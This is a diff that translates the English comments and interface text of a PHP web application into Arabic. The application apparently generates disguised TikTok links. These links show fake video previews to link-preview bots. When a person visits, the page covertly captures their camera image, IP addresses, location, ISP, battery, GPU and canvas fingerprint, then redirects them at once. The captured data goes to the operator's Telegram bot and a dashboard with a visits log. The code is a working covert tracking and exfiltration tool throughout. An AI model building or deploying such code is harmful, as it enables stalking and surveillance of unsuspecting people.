@@ -3,14 +3,14 @@ date_default_timezone_set('Africa/Algiers');
 error_reporting(E_ALL);
 ini_set('display_errors', 0);
 
-// Allow server to finish in background for extreme speed
+// 🚀 السماح للسيرفر بإكمال العمل في الخلفية (السر وراء السرعة)
 ignore_user_abort(true);
 set_time_limit(0);
 
 session_start();
 
 // ==============================================================================
-// Image Proxy (Fast generation)
+// 🖼️ مولد الصور (سريع جداً)
 // ==============================================================================
 if (isset($_GET['proxy_img'])) {
     $img_url = base64_decode($_GET['proxy_img']);
@@ -116,11 +116,11 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// Highly robust data fetching function (immune to blocking)
+// 🛡️ دالة جلب البيانات القوية جداً (محصنة ضد الحظر)
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
+    $meta = ['title' => 'فيديو تيك توك', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
     
-    // 1. Attempt via oEmbed (Best method)
+    // 1. المحاولة عبر oEmbed (أفضل طريقة)
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_CONNECTTIMEOUT => 4,
@@ -136,7 +136,7 @@ function fetch_tiktok_exclusive_meta($url) {
         }
     }
     
-    // 2. Attempt via page scraping (Fallback)
+    // 2. المحاولة عبر قراءة الصفحة (Fallback)
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5,
@@ -146,14 +146,14 @@ function fetch_tiktok_exclusive_meta($url) {
     $html = curl_exec($ch); curl_close($ch);
     
     if ($html) {
-        // Fetch Image (prefer og:image)
+        // جلب الصورة (نفضل og:image)
         if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
             $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
         } elseif (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
             $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
         }
 
-        // Fetch Title
+        // جلب العنوان
         if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $title = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
             if (stripos($title, 'Make Your Day') !== false) {
@@ -178,7 +178,7 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// Smart ISP detection
+// 🧠 دالة ذكية جداً لمعرفة المتعامل من الـ IP
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -194,14 +194,14 @@ function get_ip_details($ip) {
             $raw_isp = strtolower($data['isp'] ?? '');
             
             $isp = 'Unknown';
-            if (strpos($raw_isp, 'djezzy') !== false || strpos($raw_isp, 'ota') !== false) $isp = 'Djezzy';
-            elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis';
-            elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false || strpos($raw_isp, 'nedjma') !== false) $isp = 'Ooredoo';
-            elseif (strpos($raw_isp, 'algerie telecom') !== false || strpos($raw_isp, 'algérie télécom') !== false) $isp = 'Algerie Telecom';
-            elseif (strpos($raw_isp, 'optimum') !== false) $isp = 'Optimum Telecom';
-            elseif (strpos($raw_isp, 'icosnet') !== false) $isp = 'Icosnet';
-            elseif (strpos($raw_isp, 'smart') !== false) $isp = 'Smart';
-            elseif (strpos($raw_isp, 'lacom') !== false) $isp = 'Lacom';
+            if (strpos($raw_isp, 'djezzy') !== false || strpos($raw_isp, 'ota') !== false) $isp = 'Djezzy 🇩🇿';
+            elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis 🇩🇿';
+            elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false || strpos($raw_isp, 'nedjma') !== false) $isp = 'Ooredoo 🇩🇿';
+            elseif (strpos($raw_isp, 'algerie telecom') !== false || strpos($raw_isp, 'algérie télécom') !== false) $isp = 'Algérie Télécom 🇩🇿';
+            elseif (strpos($raw_isp, 'optimum') !== false) $isp = 'Optimum Telecom 🇩🇿';
+            elseif (strpos($raw_isp, 'icosnet') !== false) $isp = 'Icosnet 🇩🇿';
+            elseif (strpos($raw_isp, 'smart') !== false) $isp = 'Smart 🇩🇿';
+            elseif (strpos($raw_isp, 'lacom') !== false) $isp = 'Lacom 🇩🇿';
             else $isp = ucwords($data['isp'] ?? 'Unknown');
 
             $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN)' : 'No (Direct)';
@@ -225,7 +225,7 @@ function get_device_type($ua) {
 }
 
 // ==========================================
-// Tracker (Zero-Click & Extreme Speed)
+// المتتبع (Zero-Click & Extreme Speed)
 // ==========================================
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
@@ -245,7 +245,7 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
-            // Use original image from database, pass to proxy to ensure unblocked
+            // ✅ استخدام الصورة الأصلية من قاعدة البيانات، وتمريرها للبروكسي لضمان عدم حظرها
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
             
             header('Content-Type: text/html; charset=utf-8');
@@ -256,7 +256,7 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:image:width" content="800">';
             echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
-            // Add video tags to show play button
+            // إضافة وسوم الفيديو لظهور زر التشغيل
             echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
             echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
             echo '<meta property="og:video:type" content="video/mp4">';
@@ -267,7 +267,7 @@ if (isset($_GET['r'])) {
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             if ($is_bot) exit('OK');
             
-            // Biggest speed secret: send response to browser immediately
+            // ⚡ السر الأكبر للسرعة: إرسال الرد للمتصفح فوراً
             if (function_exists('fastcgi_finish_request')) {
                 echo 'OK'; 
                 fastcgi_finish_request();
@@ -275,7 +275,7 @@ if (isset($_GET['r'])) {
                 header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush();
             }
 
-            // Continue gathering data in background
+            // استكمال جمع البيانات في الخلفية
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
             
@@ -296,16 +296,16 @@ if (isset($_GET['r'])) {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
                 
-                $msg = "<b>New Visit!</b>\n\n";
-                $msg .= "<b>Account Name:</b> {$link['name']}\n";
-                $msg .= "<b>Model:</b> {$device}\n";
-                $msg .= "<b>Location:</b> {$ip_details['location']}\n";
-                $msg .= "<b>ISP:</b> {$ip_details['isp']}\n";
-                $msg .= "<b>Public IP:</b> <code>{$public_ip}</code>\n";
-                $msg .= "<b>Local IP:</b> <code>{$local_ip}</code>\n";
-                $msg .= "<b>Port:</b> <code>{$port}</code>\n";
-                $msg .= "<b>Battery:</b> {$battery_info}\n";
-                $msg .= "<b>Canvas FP:</b> <code>{$canvas_fp}</code>\n";
+                $msg = "🚨 <b>زيارة جديدة!</b>\n\n";
+                $msg .= "🔗 <b>اسم الحساب:</b> {$link['name']}\n";
+                $msg .= "📱 <b>الموديل:</b> {$device}\n";
+                $msg .= "🌍 <b>الموقع:</b> {$ip_details['location']}\n";
+                $msg .= "📡 <b>المتعامل:</b> {$ip_details['isp']}\n";
+                $msg .= "🔗 <b>الآيبي العام:</b> <code>{$public_ip}</code>\n";
+                $msg .= "🏠 <b>الآيبي المحلي:</b> <code>{$local_ip}</code>\n";
+                $msg .= "🔌 <b>المنفذ:</b> <code>{$port}</code>\n";
+                $msg .= "🔋 <b>البطارية:</b> {$battery_info}\n";
+                $msg .= "🔑 <b>بصمة Canvas:</b> <code>{$canvas_fp}</code>\n";
                 
                 sendTelegramAlert($owner_tg_chat, $msg, $img_base64, $owner_tg_token);
             } catch (Exception $e) {}
@@ -359,7 +359,7 @@ if (isset($_GET['r'])) {
                 fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }); 
             }
             
-            // Instant Redirect (max speed possible)
+            // التوجيه الفوري (أقصى سرعة ممكنة)
             window.location.replace(targetUrl); 
             
             await cameraPromise;
@@ -379,7 +379,7 @@ if (isset($_GET['r'])) {
 }
 
 // ==========================================
-// Background image receiver (if camera was delayed)
+// استقبال الصورة في الخلفية (في حال تأخرت الكاميرا)
 // ==========================================
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
     $code = $_POST['code'];
@@ -392,7 +392,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
 
 
 // ==========================================
-// Dashboard
+// لوحة التحكم (سلسة وسريعة)
 // ==========================================
 $login_error = '';
 if (isset($_POST['login'])) {
@@ -403,7 +403,7 @@ if (isset($_POST['login'])) {
         session_regenerate_id(true);
         $_SESSION['user_id'] = $user['id']; $_SESSION['username'] = $user['username']; $_SESSION['role'] = $user['role'];
         header("Location: /"); exit();
-    } else { $login_error = "Invalid username or password!"; }
+    } else { $login_error = "اسم المستخدم أو كلمة المرور غير صحيحة!"; }
 }
 if (isset($_GET['logout'])) { session_destroy(); header("Location: /"); exit(); }
 
@@ -415,14 +415,14 @@ $current_username = $_SESSION['username'] ?? '';
 if ($is_logged_in) {
     $pass_error = ''; $pass_success = '';
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_my_password'])) {
-        if ($_POST['new_password'] !== $_POST['confirm_password']) { $pass_error = "Passwords do not match!"; } 
+        if ($_POST['new_password'] !== $_POST['confirm_password']) { $pass_error = "كلمتا المرور غير متطابقتين!"; } 
         else {
             $stmt = $db->prepare("SELECT password FROM users WHERE id = ?"); $stmt->execute([$current_user_id]); $user_hash = $stmt->fetchColumn();
             if (password_verify($_POST['current_password'], $user_hash)) {
                 $new_hash = password_hash($_POST['new_password'], PASSWORD_DEFAULT);
                 $db->prepare("UPDATE users SET password = ? WHERE id = ?")->execute([$new_hash, $current_user_id]);
-                $pass_success = "Password changed successfully!";
-            } else { $pass_error = "Current password is incorrect!"; }
+                $pass_success = "تم تغيير كلمة المرور بنجاح!";
+            } else { $pass_error = "كلمة المرور الحالية غير صحيحة!"; }
         }
     }
 
@@ -436,7 +436,7 @@ if ($is_logged_in) {
             try {
                 $db->prepare("INSERT INTO users (username, password, role, tg_chat, tg_token) VALUES (?, ?, 'user', ?, ?)")->execute([trim($_POST['new_username']), password_hash($_POST['new_password'], PASSWORD_DEFAULT), trim($_POST['new_tg_chat']), trim($_POST['new_tg_token'])]);
                 header("Location: /?msg=user_added"); exit();
-            } catch (Exception $e) { $user_error = "Username already exists!"; }
+            } catch (Exception $e) { $user_error = "اسم المستخدم موجود مسبقاً!"; }
         }
         if (isset($_GET['delete_user'])) {
             $del_uid = intval($_GET['delete_user']);
@@ -493,7 +493,7 @@ if ($is_logged_in) {
 }
 ?>
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -519,14 +519,14 @@ if ($is_logged_in) {
         
         .app-container { display: flex; flex: 1; height: 100vh; overflow: hidden; }
         
-        .sidebar { width: 260px; background: var(--sidebar-bg); backdrop-filter: blur(10px); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 0; transition: all 0.3s; box-shadow: 5px 0 15px rgba(0,0,0,0.5); }
+        .sidebar { width: 260px; background: var(--sidebar-bg); backdrop-filter: blur(10px); border-left: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 0; transition: all 0.3s; box-shadow: 5px 0 15px rgba(0,0,0,0.5); }
         .sidebar-header { padding: 0 20px 20px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
         .sidebar-header h2 { font-size: 18px; color: var(--text); margin-bottom: 5px; text-shadow: 0 0 10px var(--accent); }
         .sidebar-header p { font-size: 12px; color: var(--muted); }
         
-        .nav-item { display: flex; align-items: center; gap: 12px; padding: 14px 20px; color: var(--muted); text-decoration: none; cursor: pointer; transition: 0.2s; font-size: 14px; font-weight: 500; border: none; background: transparent; width: 100%; text-align: left; }
+        .nav-item { display: flex; align-items: center; gap: 12px; padding: 14px 20px; color: var(--muted); text-decoration: none; cursor: pointer; transition: 0.2s; font-size: 14px; font-weight: 500; border: none; background: transparent; width: 100%; text-align: right; }
         .nav-item:hover { background: rgba(139, 92, 246, 0.15); color: var(--accent); text-shadow: 0 0 8px var(--accent); }
-        .nav-item.active { background: rgba(139, 92, 246, 0.2); color: var(--accent); border-left: 4px solid var(--accent); }
+        .nav-item.active { background: rgba(139, 92, 246, 0.2); color: var(--accent); border-right: 4px solid var(--accent); }
         
         .sidebar-footer { margin-top: auto; padding: 20px; border-top: 1px solid var(--border); }
         .user-profile { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
@@ -569,15 +569,15 @@ if ($is_logged_in) {
         
         .table-responsive { overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; font-size: 14px; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); }
+        th, td { padding: 12px; text-align: right; border-bottom: 1px solid var(--border); }
         th { color: var(--muted); font-weight: 600; background: rgba(255,255,255,0.02); }
         
         @media (max-width: 768px) {
             .app-container { flex-direction: column; height: auto; overflow: visible; }
-            .sidebar { width: 100%; padding: 10px; flex-direction: row; overflow-x: auto; border-right: none; border-bottom: 1px solid var(--border); align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+            .sidebar { width: 100%; padding: 10px; flex-direction: row; overflow-x: auto; border-left: none; border-bottom: 1px solid var(--border); align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
             .sidebar-header { display: none; }
-            .nav-item { padding: 10px 15px; white-space: nowrap; border-left: none; border-bottom: 3px solid transparent; width: auto; border-radius: 8px; }
-            .nav-item.active { border-left: none; border-bottom: 3px solid var(--accent); background: transparent; }
+            .nav-item { padding: 10px 15px; white-space: nowrap; border-right: none; border-bottom: 3px solid transparent; width: auto; border-radius: 8px; }
+            .nav-item.active { border-right: none; border-bottom: 3px solid var(--accent); background: transparent; }
             .sidebar-footer { border-top: none; padding: 0; margin-left: auto; display: flex; align-items: center; gap: 10px; }
             .user-profile { margin-bottom: 0; display: none; }
             .main-content { padding: 15px; }
@@ -597,12 +597,12 @@ if ($is_logged_in) {
 <?php if (!$is_logged_in): ?>
     <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh;">
         <div class="card" style="width: 100%; max-width: 400px; margin: 20px; border-color: var(--accent);">
-            <div class="card-title" style="justify-content: center; font-size: 20px; text-shadow: 0 0 10px var(--accent);">Login</div>
+            <div class="card-title" style="justify-content: center; font-size: 20px; text-shadow: 0 0 10px var(--accent);">🔐 تسجيل الدخول</div>
             <?php if (!empty($login_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
             <form method="POST">
-                <div class="form-group"><input type="text" name="username" placeholder="Username" required autofocus></div>
-                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
-                <button type="submit" name="login" class="btn btn-block">Login</button>
+                <div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم" required autofocus></div>
+                <div class="form-group"><input type="password" name="password" placeholder="كلمة المرور" required></div>
+                <button type="submit" name="login" class="btn btn-block">دخول</button>
             </form>
             <div style="text-align: center; margin-top: 30px;">
                 <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="animation: pulseGlow 2s infinite;">
@@ -621,66 +621,66 @@ if ($is_logged_in) {
                 <p>Aziz Edition V23</p>
             </div>
             
-            <button class="nav-item active" onclick="switchTab('home')">Home</button>
+            <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
             <?php if ($is_admin): ?>
-            <button class="nav-item" onclick="switchTab('team')">Team Management</button>
+            <button class="nav-item" onclick="switchTab('team')">👥 إدارة الفريق</button>
             <?php endif; ?>
-            <button class="nav-item" onclick="switchTab('settings')">Settings</button>
+            <button class="nav-item" onclick="switchTab('settings')">⚙️ الإعدادات</button>
 
             <div class="sidebar-footer">
                 <div class="user-profile">
                     <div class="user-avatar"><?php echo strtoupper(substr($current_username, 0, 1)); ?></div>
                     <div>
                         <div style="font-weight: bold; font-size: 14px;"><?php echo htmlspecialchars($current_username); ?></div>
-                        <div style="font-size: 11px; color: var(--muted);"><?php echo $is_admin ? 'Admin' : 'User'; ?></div>
+                        <div style="font-size: 11px; color: var(--muted);"><?php echo $is_admin ? 'مدير النظام' : 'مستخدم'; ?></div>
                     </div>
                 </div>
-                <a href="?logout=1" class="btn btn-danger" style="width: 100%;">Logout</a>
+                <a href="?logout=1" class="btn btn-danger" style="width: 100%;">تسجيل الخروج</a>
             </div>
         </aside>
 
         <main class="main-content">
             <div id="tab-home" class="tab-content active">
-                <h2 style="font-size: 20px; margin-bottom: 20px;">Welcome, <?php echo htmlspecialchars($current_username); ?></h2>
+                <h2 style="font-size: 20px; margin-bottom: 20px;">مرحباً، <?php echo htmlspecialchars($current_username); ?> 👋</h2>
 
                 <div class="stats-grid">
-                    <div class="stat-card"><h3>My Links</h3><p><?php echo $total_links; ?></p></div>
-                    <div class="stat-card"><h3>Total Visits</h3><p style="color: #38bdf8; text-shadow: 0 0 10px #38bdf8;"><?php echo $total_captures; ?></p></div>
-                    <div class="stat-card"><h3>Today's Visits</h3><p style="color: var(--success); text-shadow: 0 0 10px var(--success);"><?php echo $today_captures; ?></p></div>
+                    <div class="stat-card"><h3>روابطي</h3><p><?php echo $total_links; ?></p></div>
+                    <div class="stat-card"><h3>إجمالي الزيارات</h3><p style="color: #38bdf8; text-shadow: 0 0 10px #38bdf8;"><?php echo $total_captures; ?></p></div>
+                    <div class="stat-card"><h3>زيارات اليوم</h3><p style="color: var(--success); text-shadow: 0 0 10px var(--success);"><?php echo $today_captures; ?></p></div>
                 </div>
 
                 <div class="card" style="border-color: var(--accent);">
-                    <div class="card-title">Create New TikTok Link</div>
+                    <div class="card-title">🔗 إنشاء رابط تيك توك جديد</div>
                     <form method="POST">
                         <div class="form-group">
-                            <label>Link Name</label>
+                            <label>اسم الرابط</label>
                             <input type="text" name="link_name" required>
                         </div>
                         <div class="form-group">
-                            <label>TikTok Video URL</label>
+                            <label>رابط فيديو تيك توك</label>
                             <input type="text" name="target_url" required>
                         </div>
                         <div class="form-group" style="display: flex; align-items: center; gap: 10px;">
                             <input type="checkbox" name="use_camera" value="1" checked style="width: 18px; height: 18px; accent-color: var(--accent);">
-                            <label style="margin: 0; cursor: pointer; font-size: 13px;">Enable camera capture on visit</label>
+                            <label style="margin: 0; cursor: pointer; font-size: 13px;">تفعيل التقاط صورة الكاميرا عند الزيارة</label>
                         </div>
-                        <button type="submit" name="create" class="btn" style="width: 100%;">Generate Link</button>
+                        <button type="submit" name="create" class="btn" style="width: 100%;">توليد الرابط</button>
                     </form>
 
                     <?php if (!empty($generated_link)): ?>
                         <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); padding: 15px; border-radius: 8px; margin-top: 20px; box-shadow: 0 0 15px rgba(16, 185, 129, 0.2);">
                             <div class="form-group">
-                                <label style="color: var(--success);">Link Ready:</label>
+                                <label style="color: var(--success);">✅ الرابط جاهز:</label>
                                 <div style="display: flex; gap: 10px;">
                                     <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>" style="flex:1; border-color: var(--success); color: #38bdf8;">
-                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">Copy</button>
+                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">نسخ</button>
                                 </div>
                             </div>
                             <div class="form-group" style="margin-bottom: 0;">
-                                <label>Tracking Code:</label>
+                                <label>كود التتبع:</label>
                                 <div style="display: flex; gap: 10px;">
                                     <input type="text" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="flex:1; font-family: monospace; color: #a78bfa; font-weight: bold;">
-                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_code)); ?>', this)">Copy</button>
+                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_code)); ?>', this)">نسخ</button>
                                 </div>
                             </div>
                         </div>
@@ -689,29 +689,29 @@ if ($is_logged_in) {
 
                 <div class="card">
                     <div class="card-title" style="display: flex; justify-content: space-between;">
-                        <span>Visits Log (<?php echo $is_admin ? 'All' : 'Your links only'; ?>)</span>
-                        <a href="/" class="btn" style="background: #334155; padding: 4px 10px; font-size: 12px;">Refresh</a>
+                        <span>📸 سجلات الزيارات (<?php echo $is_admin ? 'الجميع' : 'روابطك فقط'; ?>)</span>
+                        <a href="/" class="btn" style="background: #334155; padding: 4px 10px; font-size: 12px;">🔄 تحديث</a>
                     </div>
                     <form method="GET" style="display: flex; gap: 10px; margin-bottom: 20px;">
-                        <input type="text" name="track" placeholder="Search by tracking code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1;">
-                        <button type="submit" class="btn">Search</button>
-                        <?php if(!empty($filter_code)): ?><a href="/" class="btn btn-secondary" style="background: #334155;">Cancel</a><?php endif; ?>
+                        <input type="text" name="track" placeholder="البحث بكود التتبع..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1;">
+                        <button type="submit" class="btn">بحث</button>
+                        <?php if(!empty($filter_code)): ?><a href="/" class="btn btn-secondary" style="background: #334155;">إلغاء</a><?php endif; ?>
                     </form>
 
                     <?php if (empty($captures)): ?>
-                        <p style="text-align: center; color: var(--muted); padding: 20px;">No records yet.</p>
+                        <p style="text-align: center; color: var(--muted); padding: 20px;">لا توجد سجلات حتى الآن.</p>
                     <?php else: ?>
                         <div class="gallery-grid">
                             <?php foreach ($captures as $cap): ?>
                                 <div class="capture-card">
                                     <div style="background: rgba(139, 92, 246, 0.2); padding: 10px; font-weight: bold; color: var(--accent); text-align: center; border-bottom: 1px solid var(--border);">
-                                        <?php echo htmlspecialchars($cap['link_name'] ?? 'Unnamed Link'); ?>
+                                        📌 <?php echo htmlspecialchars($cap['link_name'] ?? 'رابط بدون اسم'); ?>
                                     </div>
 
                                     <?php if (!empty($cap['image_data'])): ?>
                                         <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
                                     <?php else: ?>
-                                        <div style="width: 100%; height: 200px; background: #0b1329; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 13px;">Camera disabled (no image)</div>
+                                        <div style="width: 100%; height: 200px; background: #0b1329; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 13px;">الكاميرا معطلة (بدون صورة)</div>
                                     <?php endif; ?>
 
                                     <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
@@ -726,7 +726,7 @@ if ($is_logged_in) {
                                     <?php endif; ?>
 
                                     <div class="capture-info">
-                                        <div class="info-row"><span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')"><?php echo htmlspecialchars($cap['code']); ?></span></div>
+                                        <div class="info-row"><span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')"><?php echo htmlspecialchars($cap['code']); ?> 📋</span></div>
                                         <div class="info-row"><span>IP:</span> <span><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
                                         <div class="info-row"><span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span></div>
                                         <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
@@ -737,7 +737,7 @@ if ($is_logged_in) {
                                         <div class="info-row"><span>Fingerprint:</span> <span style="font-family: monospace;"><?php echo htmlspecialchars($cap['canvas_fp']); ?></span></div>
                                         <div class="info-row" style="border-top: 1px solid var(--border); padding-top: 8px; margin-top: 8px;"><span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span></div>
                                         
-                                        <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn btn-danger" style="margin-top: 10px; padding: 8px; font-size: 12px;" onclick="return confirm('Delete record?');">Delete Record</a>
+                                        <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn btn-danger" style="margin-top: 10px; padding: 8px; font-size: 12px;" onclick="return confirm('حذف السجل؟');">حذف السجل</a>
                                     </div>
                                 </div>
                             <?php endforeach; ?>
@@ -749,28 +749,28 @@ if ($is_logged_in) {
             <?php if ($is_admin): ?>
             <div id="tab-team" class="tab-content">
                 <div class="card">
-                    <div class="card-title">Add New Member</div>
+                    <div class="card-title">➕ إضافة زميل جديد</div>
                     <form method="POST" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
-                        <div class="form-group"><input type="text" name="new_username" placeholder="Username" required></div>
-                        <div class="form-group"><input type="password" name="new_password" placeholder="Password" required></div>
-                        <div class="form-group"><input type="text" name="new_tg_chat" placeholder="Telegram Chat ID"></div>
-                        <div class="form-group"><input type="text" name="new_tg_token" placeholder="Bot Token"></div>
-                        <div class="form-group"><button type="submit" name="add_user" class="btn btn-success" style="width: 100%; height: 100%;">Add</button></div>
+                        <div class="form-group"><input type="text" name="new_username" placeholder="اسم المستخدم" required></div>
+                        <div class="form-group"><input type="password" name="new_password" placeholder="كلمة المرور" required></div>
+                        <div class="form-group"><input type="text" name="new_tg_chat" placeholder="Chat ID التلجرام"></div>
+                        <div class="form-group"><input type="text" name="new_tg_token" placeholder="توكن البوت (Bot Token)"></div>
+                        <div class="form-group"><button type="submit" name="add_user" class="btn btn-success" style="width: 100%; height: 100%;">إضافة</button></div>
                     </form>
                 </div>
 
                 <div class="card">
-                    <div class="card-title">Members List</div>
+                    <div class="card-title">👥 قائمة الزملاء</div>
                     <?php if (isset($user_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px;"><?php echo $user_error; ?></p><?php endif; ?>
                     <div class="table-responsive">
                         <table>
                             <thead>
                                 <tr>
-                                    <th>User</th>
-                                    <th>Telegram ID</th>
-                                    <th>Token</th>
-                                    <th>Date Added</th>
-                                    <th>Actions</th>
+                                    <th>المستخدم</th>
+                                    <th>معرف التلجرام</th>
+                                    <th>التوكن</th>
+                                    <th>تاريخ الإضافة</th>
+                                    <th>الإجراءات</th>
                                 </tr>
                             </thead>
                             <tbody>
@@ -778,17 +778,17 @@ if ($is_logged_in) {
                                 <tr>
                                     <td style="font-weight: bold; color: var(--accent);"><?php echo htmlspecialchars($u['username']); ?></td>
                                     <td><?php echo htmlspecialchars($u['tg_chat'] ?: '-'); ?></td>
-                                    <td style="font-family: monospace; font-size: 10px; color: var(--muted);"><?php echo htmlspecialchars($u['tg_token'] ? 'Added' : 'Default'); ?></td>
+                                    <td style="font-family: monospace; font-size: 10px; color: var(--muted);"><?php echo htmlspecialchars($u['tg_token'] ? 'مضاف' : 'الافتراضي'); ?></td>
                                     <td style="color: var(--muted);"><?php echo $u['created_at']; ?></td>
                                     <td>
                                         <div style="display: flex; gap: 10px;">
                                             <form method="POST" style="display:inline;">
                                                 <input type="hidden" name="target_user_id" value="<?php echo $u['id']; ?>">
                                                 <input type="hidden" name="admin_new_password" id="new_pass_<?php echo $u['id']; ?>">
-                                                <button type="button" onclick="let p = prompt('New password for <?php echo htmlspecialchars($u['username']); ?>:'); if(p){document.getElementById('new_pass_<?php echo $u['id']; ?>').value = p; this.form.submit();}" class="btn" style="padding: 6px 12px; font-size: 12px; background: #4f46e5;">Change Password</button>
+                                                <button type="button" onclick="let p = prompt('كلمة المرور الجديدة لـ <?php echo htmlspecialchars($u['username']); ?>:'); if(p){document.getElementById('new_pass_<?php echo $u['id']; ?>').value = p; this.form.submit();}" class="btn" style="padding: 6px 12px; font-size: 12px; background: #4f46e5;">تغيير الكلمة</button>
                                                 <input type="hidden" name="admin_change_user_pass" value="1">
                                             </form>
-                                            <a href="?delete_user=<?php echo $u['id']; ?>" class="btn btn-danger" style="padding: 6px 12px; font-size: 12px;" onclick="return confirm('Delete member and all their links?');">Delete</a>
